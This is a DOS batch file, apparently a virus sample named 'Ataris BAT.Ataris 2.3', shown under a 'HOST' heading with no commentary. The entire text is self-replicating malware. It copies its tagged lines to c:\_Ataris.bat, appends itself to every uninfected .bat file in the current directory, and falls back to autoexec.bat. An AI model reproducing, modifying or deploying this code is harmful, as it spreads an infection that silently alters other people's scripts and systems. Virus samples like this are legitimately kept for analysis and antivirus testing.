::**** HOST ****

::Ataris BAT.Ataris 2.3
@echo off%_Ataris%
if '%1=='Ataris goto Ataris%2
set Ataris=%0.bat
if not exist %Ataris% set Ataris=%0
if '%Ataris%==' set Ataris=autoexec.bat
if exist c:\_Ataris.bat goto Atarisg
if not exist %Ataris% goto eAtaris
find "Ataris"<%Ataris%>c:\_Ataris.bat
:Atarisg
command /e:5000 /c c:\_Ataris Ataris vir
:eAtaris
set Ataris=
goto Atarisend
:Atarisvir
for %%a in (*.bat) do call c:\_Ataris Ataris i %%a
exit Ataris
:Atarisi
find "Ataris"<%3>nul
if not errorlevel 1 goto Atarisj
type %3>Ataris$
echo.>>Ataris$
type c:\_Ataris.bat>>Ataris$
move Ataris$ %3>nul
exit Ataris
:Atarisj
set Ataris!=%Ataris#%1
if %Ataris!%==1 exit
:Atarisend
